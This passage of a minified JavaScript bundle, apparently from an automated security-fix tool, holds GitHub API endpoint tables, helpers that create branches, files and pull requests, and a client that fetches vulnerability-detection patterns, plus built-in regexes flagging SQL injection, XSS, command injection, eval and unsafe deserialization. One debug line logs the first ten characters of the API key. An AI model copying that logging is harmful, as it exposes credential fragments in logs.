/repos/{owner}/{repo}/branches/{branch}/protection/restrictions/teams",{},{mapToData:"teams"}],removeUserAccessRestrictions:["DELETE /repos/{owner}/{repo}/branches/{branch}/protection/restrictions/users",{},{mapToData:"users"}],renameBranch:["POST /repos/{owner}/{repo}/branches/{branch}/rename"],replaceAllTopics:["PUT /repos/{owner}/{repo}/topics"],requestPagesBuild:["POST /repos/{owner}/{repo}/pages/builds"],setAdminBranchProtection:["POST /repos/{owner}/{repo}/branches/{branch}/protection/enforce_admins"],setAppAccessRestrictions:["PUT /repos/{owner}/{repo}/branches/{branch}/protection/restrictions/apps",{},{mapToData:"apps"}],setStatusCheckContexts:["PUT /repos/{owner}/{repo}/branches/{branch}/protection/required_status_checks/contexts",{},{mapToData:"contexts"}],setTeamAccessRestrictions:["PUT /repos/{owner}/{repo}/branches/{branch}/protection/restrictions/teams",{},{mapToData:"teams"}],setUserAccessRestrictions:["PUT /repos/{owner}/{repo}/branches/{branch}/protection/restrictions/users",{},{mapToData:"users"}],testPushWebhook:["POST /repos/{owner}/{repo}/hooks/{hook_id}/tests"],transfer:["POST /repos/{owner}/{repo}/transfer"],update:["PATCH /repos/{owner}/{repo}"],updateBranchProtection:["PUT /repos/{owner}/{repo}/branches/{branch}/protection"],updateCommitComment:["PATCH /repos/{owner}/{repo}/comments/{comment_id}"],updateDeploymentBranchPolicy:["PUT /repos/{owner}/{repo}/environments/{environment_name}/deployment-branch-policies/{branch_policy_id}"],updateInformationAboutPagesSite:["PUT /repos/{owner}/{repo}/pages"],updateInvitation:["PATCH /repos/{owner}/{repo}/invitations/{invitation_id}"],updateOrgRuleset:["PUT /orgs/{org}/rulesets/{ruleset_id}"],updatePullRequestReviewProtection:["PATCH /repos/{owner}/{repo}/branches/{branch}/protection/required_pull_request_reviews"],updateRelease:["PATCH /repos/{owner}/{repo}/releases/{release_id}"],updateReleaseAsset:["PATCH /repos/{owner}/{repo}/releases/assets/{asset_id}"],updateRepoRuleset:["PUT /repos/{owner}/{repo}/rulesets/{ruleset_id}"],updateStatusCheckPotection:["PATCH /repos/{owner}/{repo}/branches/{branch}/protection/required_status_checks",{},{renamed:["repos","updateStatusCheckProtection"]}],updateStatusCheckProtection:["PATCH /repos/{owner}/{repo}/branches/{branch}/protection/required_status_checks"],updateWebhook:["PATCH /repos/{owner}/{repo}/hooks/{hook_id}"],updateWebhookConfigForRepo:["PATCH /repos/{owner}/{repo}/hooks/{hook_id}/config"],uploadReleaseAsset:["POST /repos/{owner}/{repo}/releases/{release_id}/assets{?name,label}",{baseUrl:"https://uploads.github.com"}]},search:{code:["GET /search/code"],commits:["GET /search/commits"],issuesAndPullRequests:["GET /search/issues",{},{deprecated:"octokit.rest.search.issuesAndPullRequests() is deprecated, see https://docs.github.com/rest/search/search#search-issues-and-pull-requests"}],labels:["GET /search/labels"],repos:["GET /search/repositories"],topics:["GET /search/topics"],users:["GET /search/users"]},secretScanning:{createPushProtectionBypass:["POST /repos/{owner}/{repo}/secret-scanning/push-protection-bypasses"],getAlert:["GET /repos/{owner}/{repo}/secret-scanning/alerts/{alert_number}"],getScanHistory:["GET /repos/{owner}/{repo}/secret-scanning/scan-history"],listAlertsForEnterprise:["GET /enterprises/{enterprise}/secret-scanning/alerts"],listAlertsForOrg:["GET /orgs/{org}/secret-scanning/alerts"],listAlertsForRepo:["GET /repos/{owner}/{repo}/secret-scanning/alerts"],listLocationsForAlert:["GET /repos/{owner}/{repo}/secret-scanning/alerts/{alert_number}/locations"],updateAlert:["PATCH /repos/{owner}/{repo}/secret-scanning/alerts/{alert_number}"]},securityAdvisories:{createFork:["POST /repos/{owner}/{repo}/security-advisories/{ghsa_id}/forks"],createPrivateVulnerabilityReport:["POST /repos/{owner}/{repo}/security-advisories/reports"],createRepositoryAdvisory:["POST /repos/{owner}/{repo}/security-advisories"],createRepositoryAdvisoryCveRequest:["POST /repos/{owner}/{repo}/security-advisories/{ghsa_id}/cve"],getGlobalAdvisory:["GET /advisories/{ghsa_id}"],getRepositoryAdvisory:["GET /repos/{owner}/{repo}/security-advisories/{ghsa_id}"],listGlobalAdvisories:["GET /advisories"],listOrgRepositoryAdvisories:["GET /orgs/{org}/security-advisories"],listRepositoryAdvisories:["GET /repos/{owner}/{repo}/security-advisories"],updateRepositoryAdvisory:["PATCH /repos/{owner}/{repo}/security-advisories/{ghsa_id}"]},teams:{addOrUpdateMembershipForUserInOrg:["PUT /orgs/{org}/teams/{team_slug}/memberships/{username}"],addOrUpdateProjectPermissionsInOrg:["PUT /orgs/{org}/teams/{team_slug}/projects/{project_id}",{},{deprecated:"octokit.rest.teams.addOrUpdateProjectPermissionsInOrg() is deprecated, see https://docs.github.com/rest/teams/teams#add-or-update-team-project-permissions"}],addOrUpdateProjectPermissionsLegacy:["PUT /teams/{team_id}/projects/{project_id}",{},{deprecated:"octokit.rest.teams.addOrUpdateProjectPermissionsLegacy() is deprecated, see https://docs.github.com/rest/teams/teams#add-or-update-team-project-permissions-legacy"}],addOrUpdateRepoPermissionsInOrg:["PUT /orgs/{org}/teams/{team_slug}/repos/{owner}/{repo}"],checkPermissionsForProjectInOrg:["GET /orgs/{org}/teams/{team_slug}/projects/{project_id}",{},{deprecated:"octokit.rest.teams.checkPermissionsForProjectInOrg() is deprecated, see https://docs.github.com/rest/teams/teams#check-team-permissions-for-a-project"}],checkPermissionsForProjectLegacy:["GET /teams/{team_id}/projects/{project_id}",{},{deprecated:"octokit.rest.teams.checkPermissionsForProjectLegacy() is deprecated, see https://docs.github.com/rest/teams/teams#check-team-permissions-for-a-project-legacy"}],checkPermissionsForRepoInOrg:["GET /orgs/{org}/teams/{team_slug}/repos/{owner}/{repo}"],create:["POST /orgs/{org}/teams"],createDiscussionCommentInOrg:["POST /orgs/{org}/teams/{team_slug}/discussions/{discussion_number}/comments"],createDiscussionInOrg:["POST /orgs/{org}/teams/{team_slug}/discussions"],deleteDiscussionCommentInOrg:["DELETE /orgs/{org}/teams/{team_slug}/discussions/{discussion_number}/comments/{comment_number}"],deleteDiscussionInOrg:["DELETE /orgs/{org}/teams/{team_slug}/discussions/{discussion_number}"],deleteInOrg:["DELETE /orgs/{org}/teams/{team_slug}"],getByName:["GET /orgs/{org}/teams/{team_slug}"],getDiscussionCommentInOrg:["GET /orgs/{org}/teams/{team_slug}/discussions/{discussion_number}/comments/{comment_number}"],getDiscussionInOrg:["GET /orgs/{org}/teams/{team_slug}/discussions/{discussion_number}"],getMembershipForUserInOrg:["GET /orgs/{org}/teams/{team_slug}/memberships/{username}"],list:["GET /orgs/{org}/teams"],listChildInOrg:["GET /orgs/{org}/teams/{team_slug}/teams"],listDiscussionCommentsInOrg:["GET /orgs/{org}/teams/{team_slug}/discussions/{discussion_number}/comments"],listDiscussionsInOrg:["GET /orgs/{org}/teams/{team_slug}/discussions"],listForAuthenticatedUser:["GET /user/teams"],listMembersInOrg:["GET /orgs/{org}/teams/{team_slug}/members"],listPendingInvitationsInOrg:["GET /orgs/{org}/teams/{team_slug}/invitations"],listProjectsInOrg:["GET /orgs/{org}/teams/{team_slug}/projects",{},{deprecated:"octokit.rest.teams.listProjectsInOrg() is deprecated, see https://docs.github.com/rest/teams/teams#list-team-projects"}],listProjectsLegacy:["GET /teams/{team_id}/projects",{},{deprecated:"octokit.rest.teams.listProjectsLegacy() is deprecated, see https://docs.github.com/rest/teams/teams#list-team-projects-legacy"}],listReposInOrg:["GET /orgs/{org}/teams/{team_slug}/repos"],removeMembershipForUserInOrg:["DELETE /orgs/{org}/teams/{team_slug}/memberships/{username}"],removeProjectInOrg:["DELETE /orgs/{org}/teams/{team_slug}/projects/{project_id}",{},{deprecated:"octokit.rest.teams.removeProjectInOrg() is deprecated, see https://docs.github.com/rest/teams/teams#remove-a-project-from-a-team"}],removeProjectLegacy:["DELETE /teams/{team_id}/projects/{project_id}",{},{deprecated:"octokit.rest.teams.removeProjectLegacy() is deprecated, see https://docs.github.com/rest/teams/teams#remove-a-project-from-a-team-legacy"}],removeRepoInOrg:["DELETE /orgs/{org}/teams/{team_slug}/repos/{owner}/{repo}"],updateDiscussionCommentInOrg:["PATCH /orgs/{org}/teams/{team_slug}/discussions/{discussion_number}/comments/{comment_number}"],updateDiscussionInOrg:["PATCH /orgs/{org}/teams/{team_slug}/discussions/{discussion_number}"],updateInOrg:["PATCH /orgs/{org}/teams/{team_slug}"]},users:{addEmailForAuthenticated:["POST /user/emails",{},{renamed:["users","addEmailForAuthenticatedUser"]}],addEmailForAuthenticatedUser:["POST /user/emails"],addSocialAccountForAuthenticatedUser:["POST /user/social_accounts"],block:["PUT /user/blocks/{username}"],checkBlocked:["GET /user/blocks/{username}"],checkFollowingForUser:["GET /users/{username}/following/{target_user}"],checkPersonIsFollowedByAuthenticated:["GET /user/following/{username}"],createGpgKeyForAuthenticated:["POST /user/gpg_keys",{},{renamed:["users","createGpgKeyForAuthenticatedUser"]}],createGpgKeyForAuthenticatedUser:["POST /user/gpg_keys"],createPublicSshKeyForAuthenticated:["POST /user/keys",{},{renamed:["users","createPublicSshKeyForAuthenticatedUser"]}],createPublicSshKeyForAuthenticatedUser:["POST /user/keys"],createSshSigningKeyForAuthenticatedUser:["POST /user/ssh_signing_keys"],deleteEmailForAuthenticated:["DELETE /user/emails",{},{renamed:["users","deleteEmailForAuthenticatedUser"]}],deleteEmailForAuthenticatedUser:["DELETE /user/emails"],deleteGpgKeyForAuthenticated:["DELETE /user/gpg_keys/{gpg_key_id}",{},{renamed:["users","deleteGpgKeyForAuthenticatedUser"]}],deleteGpgKeyForAuthenticatedUser:["DELETE /user/gpg_keys/{gpg_key_id}"],deletePublicSshKeyForAuthenticated:["DELETE /user/keys/{key_id}",{},{renamed:["users","deletePublicSshKeyForAuthenticatedUser"]}],deletePublicSshKeyForAuthenticatedUser:["DELETE /user/keys/{key_id}"],deleteSocialAccountForAuthenticatedUser:["DELETE /user/social_accounts"],deleteSshSigningKeyForAuthenticatedUser:["DELETE /user/ssh_signing_keys/{ssh_signing_key_id}"],follow:["PUT /user/following/{username}"],getAuthenticated:["GET /user"],getById:["GET /user/{account_id}"],getByUsername:["GET /users/{username}"],getContextForUser:["GET /users/{username}/hovercard"],getGpgKeyForAuthenticated:["GET /user/gpg_keys/{gpg_key_id}",{},{renamed:["users","getGpgKeyForAuthenticatedUser"]}],getGpgKeyForAuthenticatedUser:["GET /user/gpg_keys/{gpg_key_id}"],getPublicSshKeyForAuthenticated:["GET /user/keys/{key_id}",{},{renamed:["users","getPublicSshKeyForAuthenticatedUser"]}],getPublicSshKeyForAuthenticatedUser:["GET /user/keys/{key_id}"],getSshSigningKeyForAuthenticatedUser:["GET /user/ssh_signing_keys/{ssh_signing_key_id}"],list:["GET /users"],listAttestations:["GET /users/{username}/attestations/{subject_digest}"],listBlockedByAuthenticated:["GET /user/blocks",{},{renamed:["users","listBlockedByAuthenticatedUser"]}],listBlockedByAuthenticatedUser:["GET /user/blocks"],listEmailsForAuthenticated:["GET /user/emails",{},{renamed:["users","listEmailsForAuthenticatedUser"]}],listEmailsForAuthenticatedUser:["GET /user/emails"],listFollowedByAuthenticated:["GET /user/following",{},{renamed:["users","listFollowedByAuthenticatedUser"]}],listFollowedByAuthenticatedUser:["GET /user/following"],listFollowersForAuthenticatedUser:["GET /user/followers"],listFollowersForUser:["GET /users/{username}/followers"],listFollowingForUser:["GET /users/{username}/following"],listGpgKeysForAuthenticated:["GET /user/gpg_keys",{},{renamed:["users","listGpgKeysForAuthenticatedUser"]}],listGpgKeysForAuthenticatedUser:["GET /user/gpg_keys"],listGpgKeysForUser:["GET /users/{username}/gpg_keys"],listPublicEmailsForAuthenticated:["GET /user/public_emails",{},{renamed:["users","listPublicEmailsForAuthenticatedUser"]}],listPublicEmailsForAuthenticatedUser:["GET /user/public_emails"],listPublicKeysForUser:["GET /users/{username}/keys"],listPublicSshKeysForAuthenticated:["GET /user/keys",{},{renamed:["users","listPublicSshKeysForAuthenticatedUser"]}],listPublicSshKeysForAuthenticatedUser:["GET /user/keys"],listSocialAccountsForAuthenticatedUser:["GET /user/social_accounts"],listSocialAccountsForUser:["GET /users/{username}/social_accounts"],listSshSigningKeysForAuthenticatedUser:["GET /user/ssh_signing_keys"],listSshSigningKeysForUser:["GET /users/{username}/ssh_signing_keys"],setPrimaryEmailVisibilityForAuthenticated:["PATCH /user/email/visibility",{},{renamed:["users","setPrimaryEmailVisibilityForAuthenticatedUser"]}],setPrimaryEmailVisibilityForAuthenticatedUser:["PATCH /user/email/visibility"],unblock:["DELETE /user/blocks/{username}"],unfollow:["DELETE /user/following/{username}"],updateAuthenticated:["PATCH /user"]}},FK=qT});function bY(X){let J={};for(let Q of wX.keys())J[Q]=new Proxy({octokit:X,scope:Q,cache:{}},ZT);return J}function MT(X,J,Q,Y,W){let z=X.request.defaults(Y);function G(...H){let U=z.endpoint.merge(...H);if(W.mapToData)return U=Object.assign({},U,{data:U[W.mapToData],[W.mapToData]:void 0}),z(U);if(W.renamed){let[K,V]=W.renamed;X.log.warn(`octokit.${J}.${Q}() has been renamed to octokit.${K}.${V}()`)}if(W.deprecated)X.log.warn(W.deprecated);if(W.renamedParameters){let K=z.endpoint.merge(...H);for(let[V,B]of Object.entries(W.renamedParameters))if(V in K){if(X.log.warn(`"${V}" parameter is deprecated for "octokit.${J}.${Q}()". Use "${B}" instead`),!(B in K))K[B]=K[V];delete K[V]}return z(K)}return z(...H)}return Object.assign(G,z)}var wX,ZT;var OK=j1(()=>{jK();wX=new Map;for(let[X,J]of Object.entries(FK))for(let[Q,Y]of Object.entries(J)){let[W,z,G]=Y,[H,U]=W.split(/ /),K=Object.assign({method:H,url:U},z);if(!wX.has(X))wX.set(X,new Map);wX.get(X).set(Q,{scope:X,methodName:Q,endpointDefaults:K,decorations:G})}ZT={has({scope:X},J){return wX.get(X).has(J)},getOwnPropertyDescriptor(X,J){return{value:this.get(X,J),configurable:!0,writable:!0,enumerable:!0}},defineProperty(X,J,Q){return Object.defineProperty(X.cache,J,Q),!0},deleteProperty(X,J){return delete X.cache[J],!0},ownKeys({scope:X}){return[...wX.get(X).keys()]},set(X,J,Q){return X.cache[J]=Q},get({octokit:X,scope:J,cache:Q},Y){if(Q[Y])return Q[Y];let W=wX.get(J).get(Y);if(!W)return;let{endpointDefaults:z,decorations:G}=W;if(G)Q[Y]=MT(X,J,Y,z,G);else Q[Y]=X.request.defaults(z);return Q[Y]}}});function FT(X){return{rest:bY(X)}}function vY(X){let J=bY(X);return{...J,rest:J}}var RK=j1(()=>{MK();OK();FT.VERSION=kY;vY.VERSION=kY});var AK="21.1.1";var NK=()=>{};var LK;var DK=j1(()=>{HK();VK();ZK();RK();NK();LK=TY.plugin(_Y,vY,$Y).defaults({userAgent:`octokit-rest.js/${AK}`})});var xY={};Y9(xY,{updateIssue:()=>LT,getRepositoryDetails:()=>U5,getIssue:()=>jT,getGitHubClient:()=>c0,createPullRequest:()=>NT,createOrUpdateFile:()=>RT,createIssueComment:()=>OT,createBranch:()=>AT,addLabels:()=>DT});function c0(X){if(oQ)return oQ;let J=X?.repoToken||process.env.GITHUB_TOKEN;if(!J)throw q.error("No GitHub token found"),new Error("No GitHub token found. Please set GITHUB_TOKEN environment variable or provide repoToken in config.");return oQ=new LK({auth:J,timeZone:"UTC"}),q.debug("GitHub API client created"),oQ}async function U5(X,J){try{let Q=c0(),{data:Y}=await Q.repos.get({owner:X,repo:J});return{id:Y.id,name:Y.name,fullName:Y.full_name,owner:Y.owner.login,defaultBranch:Y.default_branch,language:Y.language,private:Y.private}}catch(Q){throw q.error(`Error getting repository details for ${X}/${J}`,Q),new Error(`Failed to get repository details: ${Q instanceof Error?Q.message:String(Q)}`)}}async function jT(X,J,Q){try{let Y=c0(),{data:W}=await Y.issues.get({owner:X,repo:J,issue_number:Q});return{id:W.id.toString(),number:W.number,title:W.title,body:W.body||"",labels:W.labels.map((z)=>typeof z==="string"?z:z.name||""),assignees:W.assignees?.map((z)=>z.login)||[],repository:{owner:X,name:J,fullName:`${X}/${J}`,defaultBranch:"main"},source:"github",createdAt:W.created_at,updatedAt:W.updated_at,metadata:{state:W.state,user:W.user?.login}}}catch(Y){return q.error(`Error getting issue #${Q} from ${X}/${J}`,Y),null}}async function OT(X,J,Q,Y){try{await c0().issues.createComment({owner:X,repo:J,issue_number:Q,body:Y}),q.info(`Comment created on issue #${Q}`)}catch(W){throw q.error(`Error creating comment on issue #${Q}`,W),new Error(`Failed to create issue comment: ${W instanceof Error?W.message:String(W)}`)}}async function RT(X,J,Q,Y,W,z){try{let G=c0(),H;try{let{data:U}=await G.repos.getContent({owner:X,repo:J,path:Q,ref:z});if(!Array.isArray(U))H=U.sha}catch(U){q.debug(`File ${Q} doesn't exist, will create it`)}await G.repos.createOrUpdateFileContents({owner:X,repo:J,path:Q,message:W,content:Buffer.from(Y).toString("base64"),branch:z,sha:H}),q.info(`File ${Q} created or updated on branch ${z}`)}catch(G){throw q.error(`Error creating or updating file ${Q}`,G),new Error(`Failed to create or update file: ${G instanceof Error?G.message:String(G)}`)}}async function AT(X,J,Q,Y){try{let W=c0(),z=Y||"main",{data:G}=await W.git.getRef({owner:X,repo:J,ref:`heads/${z}`});await W.git.createRef({owner:X,repo:J,ref:`refs/heads/${Q}`,sha:G.object.sha}),q.info(`Branch ${Q} created from ${z}`)}catch(W){throw q.error(`Error creating branch ${Q}`,W),new Error(`Failed to create branch: ${W instanceof Error?W.message:String(W)}`)}}async function NT(X,J,Q,Y,W,z="main"){try{let G=c0(),{data:H}=await G.pulls.create({owner:X,repo:J,title:Q,body:Y,head:W,base:z});return q.info(`Pull request #${H.number} created: ${H.html_url}`),{number:H.number,html_url:H.html_url}}catch(G){throw q.error("Error creating pull request",G),new Error(`Failed to create pull request: ${G instanceof Error?G.message:String(G)}`)}}async function LT(X,J,Q,Y){let W=`https://api.github.com/repos/${X}/${J}/issues/${Q}`,z=await fetch(W,{method:"PATCH",headers:{Authorization:`token ${process.env.GITHUB_TOKEN}`,Accept:"application/vnd.github.v3+json","Content-Type":"application/json"},body:JSON.stringify(Y)});if(!z.ok)throw new Error(`Failed to update issue: ${z.statusText}`)}async function DT(X,J,Q,Y){let W=`https://api.github.com/repos/${X}/${J}/issues/${Q}/labels`,z=await fetch(W,{method:"POST",headers:{Authorization:`token ${process.env.GITHUB_TOKEN}`,Accept:"application/vnd.github.v3+json","Content-Type":"application/json"},body:JSON.stringify({labels:Y})});if(!z.ok)throw new Error(`Failed to add labels: ${z.statusText}`)}var oQ=null;var i8=j1(()=>{DK();t1()});var IX=()=>{};function CT(X){return X&&typeof X==="object"&&X.__type__==="regex"&&typeof X.source==="string"&&Array.isArray(X.flags)}class tQ{apiUrl;apiKey;cache=new Map;cacheTTL;fallbackToLocal;constructor(X={}){let Q=(X.apiUrl||process.env.RSOLV_API_URL||"https://api.rsolv.dev").replace(/\/$/,"");if(this.apiUrl=Q.includes("/api/v1/patterns")?Q:`${Q}/api/v1/patterns`,this.apiKey=X.apiKey||process.env.RSOLV_API_KEY,this.cacheTTL=(X.cacheTTL||3600)*1000,this.fallbackToLocal=X.fallbackToLocal??!0,!this.apiKey)q.warn("No RSOLV API key provided - only demo patterns available");else q.debug("PatternAPIClient initialized with API key",{keyLength:this.apiKey.length,keyPrefix:this.apiKey.substring(0,10)+"...",keyFromConfig:!!X.apiKey,keyFromEnv:!X.apiKey&&!!process.env.RSOLV_API_KEY})}async fetchPatterns(X){let J=`${X}-${this.apiKey||"demo"}`,Q=this.cache.get(J);if(Q&&Date.now()-Q.timestamp<this.cacheTTL)return q.info(`Using cached patterns for ${X} (${Q.patterns.length} patterns)`),Q.patterns;try{let Y={"Content-Type":"application/json"};if(this.apiKey)Y["x-api-key"]=this.apiKey;let W=await fetch(`${this.apiUrl}?language=${X}&format=enhanced`,{headers:Y});if(!W.ok)throw new Error(`Failed to fetch patterns: ${W.status} ${W.statusText}`);let z=await W.json(),G=z.metadata?.count||z.count||z.patterns.length;q.info(`Fetched ${G} ${X} patterns from API`);let H=z.patterns.map((U)=>this.convertToSecurityPattern(U));return this.cache.set(J,{patterns:H,timestamp:Date.now()}),H}catch(Y){if(q.error(`Failed to fetch ${X} patterns from API:`,Y),this.fallbackToLocal)return q.warn(`Falling back to local patterns for ${X}`),[];throw Y}}async fetchPatternsByTier(X,J){if(q.warn(`fetchPatternsByTier is deprecated. Tier '${X}' is ignored. Use fetchPatterns() instead.`),J)return this.fetchPatterns(J);try{return q.warn("fetchPatternsByTier called without language parameter. Returning empty array."),[]}catch(Q){throw q.error("Failed to fetch patterns from API:",Q),Q}}convertToSecurityPattern(X){let J=this.reconstructPattern(X),Q=[];if(J.regex){let z=J.regex;if(typeof z==="string")Q=[z];else if(Array.isArray(z))Q=z}else if(Array.isArray(J.regex_patterns))Q=J.regex_patterns;else if(Array.isArray(J.patterns))Q=J.patterns;else if(J.patterns&&typeof J.patterns==="object"&&"regex"in J.patterns&&Array.isArray(J.patterns.regex))Q=J.patterns.regex;else q.warn(`No regex patterns found for ${J.id}`),Q=[];let Y=Q.map((z)=>{try{if(z instanceof RegExp)return z;if(typeof z==="string"){let G=z.match(/^\/(.*)\/([gimsuvy]*)$/);if(G)return new RegExp(G[1],G[2]);return new RegExp(z)}return q.warn(`Unexpected pattern type for ${J.id}:`,z),null}catch(G){return q.warn(`Failed to compile regex for pattern ${J.id}: ${z}`),q.error(String(G)),null}}).filter(Boolean),W=J.context_rules||void 0;return{id:J.id,name:J.name,type:this.mapVulnerabilityType(J.type),severity:J.severity,description:J.description,patterns:{regex:Y,ast:J.ast_rules?[JSON.stringify(J.ast_rules)]:void 0},languages:J.languages,cweId:J.cwe_id||J.cweId||"",owaspCategory:J.owasp_category||J.owaspCategory||"",remediation:J.recommendation,examples:{vulnerable:J.test_cases?.vulnerable?.[0]||J.testCases?.vulnerable?.[0]||"",secure:J.test_cases?.safe?.[0]||J.testCases?.safe?.[0]||""},astRules:J.ast_rules,contextRules:W,confidenceRules:J.confidence_rules,minConfidence:J.min_confidence}}mapVulnerabilityType(X){return{sql_injection:"sql_injection",xss:"xss",command_injection:"command_injection",path_traversal:"path_traversal",xxe:"xml_external_entities",ssrf:"server_side_request_forgery",insecure_deserialization:"insecure_deserialization",deserialization:"insecure_deserialization",weak_crypto:"weak_cryptography",hardcoded_secret:"hardcoded_secrets",insecure_random:"weak_cryptography",open_redirect:"open_redirect",ldap_injection:"ldap_injection",xpath_injection:"xpath_injection",nosql_injection:"nosql_injection",rce:"command_injection",dos:"denial_of_service",denial_of_service:"denial_of_service",timing_attack:"information_disclosure",csrf:"cross_site_request_forgery",jwt:"broken_authentication",authentication:"broken_authentication",debug:"information_disclosure",information_disclosure:"information_disclosure",cve:"vulnerable_components",file_upload:"path_traversal",input_validation:"xss",session_management:"cross_site_request_forgery",resource_exhaustion:"denial_of_service"}[X]||"improper_input_validation"}clearCache(){this.cache.clear(),q.info("Pattern cache cleared")}convertRegexFlags(X){let J={i:"i",m:"m",s:"s",u:"u",g:"g",y:"y",d:"d"};return X.map((Q)=>J[Q]||"").filter(Boolean).join("")}reconstructRegex(X){let J=this.convertRegexFlags(X.flags);return new RegExp(X.source,J)}reconstructPattern(X){if(X===null||X===void 0)return X;if(CT(X))return this.reconstructRegex(X);if(Array.isArray(X))return X.map((J)=>this.reconstructPattern(J));if(typeof X==="object"){let J={};for(let[Q,Y]of Object.entries(X))J[Q]=this.reconstructPattern(Y);return J}return X}async checkHealth(){try{let X=await fetch(`${this.apiUrl}/health`,{method:"GET",headers:{"User-Agent":"RSOLV-Action/1.0"}});if(X.ok)return{status:"healthy"};else return{status:"unhealthy",message:`API returned status ${X.status}`}}catch(X){return{status:"unhealthy",message:X instanceof Error?X.message:"Unknown error"}}}}var gY=j1(()=>{t1();IX()});function eQ(){return[{id:"basic-sql-injection",name:"Basic SQL Injection",type:"sql_injection",severity:"high",description:"Potential SQL injection via string concatenation",patterns:{regex:[/["'`].*?(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER).*?["'`]\s*\+/gi,/execute\s*\(\s*['"`].*\+/gi]},languages:["javascript","typescript"],cweId:"CWE-89",owaspCategory:"A03:2021",remediation:"Use parameterized queries or prepared statements",examples:{vulnerable:"",secure:""}},{id:"basic-xss",name:"Basic Cross-Site Scripting",type:"xss",severity:"high",description:"Potential XSS via innerHTML",patterns:{regex:[/innerHTML\s*=\s*[^'"`;]*(userInput|userContent|req\.|request\.)/gi,/document\.write\s*\(/gi]},languages:["javascript","typescript"],cweId:"CWE-79",owaspCategory:"A03:2021",remediation:"Use textContent or proper encoding",examples:{vulnerable:"",secure:""}},{id:"basic-command-injection",name:"Basic Command Injection",type:"command_injection",severity:"critical",description:"Potential command injection",patterns:{regex:[/exec\s*\(\s*['"`].*\+/gi,/system\s*\(\s*['"`].*\+/gi]},languages:["javascript","python","ruby"],cweId:"CWE-78",owaspCategory:"A03:2021",remediation:"Validate and sanitize all user input",examples:{vulnerable:"",secure:""}},{id:"basic-path-traversal",name:"Basic Path Traversal",type:"path_traversal",severity:"high",description:"Potential path traversal vulnerability",patterns:{regex:[/readFile\s*\([^)]*\.\.\/[^)]*\)/gi,/path\.join\s*\([^)]*req\./gi]},languages:["javascript","typescript"],cweId:"CWE-22",owaspCategory:"A01:2021",remediation:"Validate and sanitize file paths",examples:{vulnerable:"",secure:""}},{id:"js-eval",name:"JavaScript Eval Usage",type:"command_injection",severity:"critical",description:"Use of eval() function",patterns:{regex:[/eval\s*\(/gi,/Function\s*\(/gi,/setTimeout\s*\([^,]*,[^,)]*\)/gi]},languages:["javascript","typescript"],cweId:"CWE-94",owaspCategory:"A03:2021",remediation:"Avoid eval(), use JSON.parse() or safer alternatives",examples:{vulnerable:"",secure:""}},{id:"python-sql-injection",name:"Python SQL Injection",type:"sql_injection",severity:"high",description:"SQL injection via string formatting or concatenation",patterns:{regex:[/\.raw\s*\(/gi,/execute\s*\(\s*["'].*%[s|d].*["']\s*%/gi,/execute\s*\(\s*["'].*\+.*["']\s*\)/gi,/cursor\.execute\s*\(\s*f["']/gi]},languages:["python"],cweId:"CWE-89",owaspCategory:"A03:2021",remediation:"Use parameterized queries with ? or %s placeholders",examples:{vulnerable:"",secure:""}},{id:"python-eval",name:"Python Eval Usage",type:"command_injection",severity:"critical",description:"Use of eval() with user input",patterns:{regex:[/eval\s*\(/gi,/exec\s*\(/gi]},languages:["python"],cweId:"CWE-94",owaspCategory:"A03:2021",remediation:"Avoid eval(), use ast.literal_eval() for safe evaluation",examples:{vulnerable:"",secure:""}},{id:"python-pickle",name:"Insecure Deserialization",type:"insecure_deserialization",severity:"high",description:"Use of pickle with untrusted data",patterns:{regex:[/pickle\.loads?\s*\(/gi,/cPickle\.loads?\s*\(/gi]},languages:["python"],cweId:"CWE-502",owaspCategory:"A08:2021",remediation:"Use JSON or other safe serialization formats",examples:{vulnerable:"",secure:""}},{id:"ruby-sql-injection",name:"Ruby SQL Injection",type:"sql_injection",severity:"high",description:"SQL injection via string interpolation",patterns:{regex:[/\.where\s*\(\s*["'].*#\{.*\}.*["']/gi,/find_by_sql\s*\(\s*["'].*#\{.*\}.*["']/gi,/execute\s*\(\s*["'].*#\{.*\}.*["']/gi]},languages:["ruby"],cweId:"CWE-89",owaspCategory:"A03:2021",remediation:"Use parameterized queries or ActiveRecord query interface",examples:{vulnerable:"",secure:""}},{id:"ruby-eval",name:"Ruby Eval Usage",type:"command_injection",severity:"critical",description:"Use of eval with user input",patterns:{regex:[/eval\s*\(/gi,/instance_eval\s*\(/gi]},languages:["ruby"],cweId:"CWE-94",owaspCategory:"A03:2021",remediation:"Avoid eval, use safe alternatives",examples:{vulnerable:"",secure:""}},{id:"ruby-yaml",name:"YAML Deserialization",type:"insecure_deserialization",severity:"high",description:"Unsafe YAML loading",patterns:{regex:[/YAML\.load\s*\(/gi,/Psych\.load\s*\(/gi]},languages:["ruby"],cweId:"CWE-502",owaspCategory:"A08:2021",remediation:"Use YAML.safe_load instead",examples:{vulnerable:"",secure:""}},{id:"java-sql-injection",name:"Java SQL Injection",type:"sql_injection",severity:"high",description:"SQL injection via string concatenation",patterns:{regex:[/\.?execute(?:Query|Update)?\s*\([^)]*\+[^)]*\)/gi,/String\s+\w*(?:query|sql|statement)\w*\s*=\s*["'].*(?:SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER).*["']\s*\+/gi,/["'].*(?:SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|FROM|WHERE|JOIN|UNION|ORDER BY|GROUP BY).*["']\s*\+/gi,/(?:StringBuilder|StringBuffer)\s*\(?\s*["'].*(?:SELECT|INSERT|UPDATE|DELETE).*["']\s*\)?.*\.append\s*\(/gi,/String\.format\s*\(\s*["'].*(?:SELECT|INSERT|UPDATE|DELETE).*%[sd].*["']/gi,/prepareStatement\s*\([^)]*\+[^)]*\)/gi,/jdbcTemplate\.(?:query|update|execute)\s*\([^)]*\+[^)]*\)/gi]},languages:["java"],cweId:"CWE-89",owaspCategory:"A03:2021",remediation:"Use PreparedStatement with parameters",examples:{vulnerable:"",secure:""}},{id:"java-xxe",name:"XML External Entity",type:"xml_external_entities",severity:"high",description:"XML parser vulnerable to XXE",patterns:{regex:[/DocumentBuilderFactory\.newInstance\s*\(\s*\)/gi,/SAXParserFactory\.newInstance\s*\(\s*\)/gi]},languages:["java"],cweId:"CWE-611",owaspCategory:"A05:2021",remediation:"Disable external entities and DTD processing",examples:{vulnerable:"",secure:""}},{id:"php-sql-injection",name:"PHP SQL Injection",type:"sql_injection",severity:"high",description:"SQL injection via string concatenation or 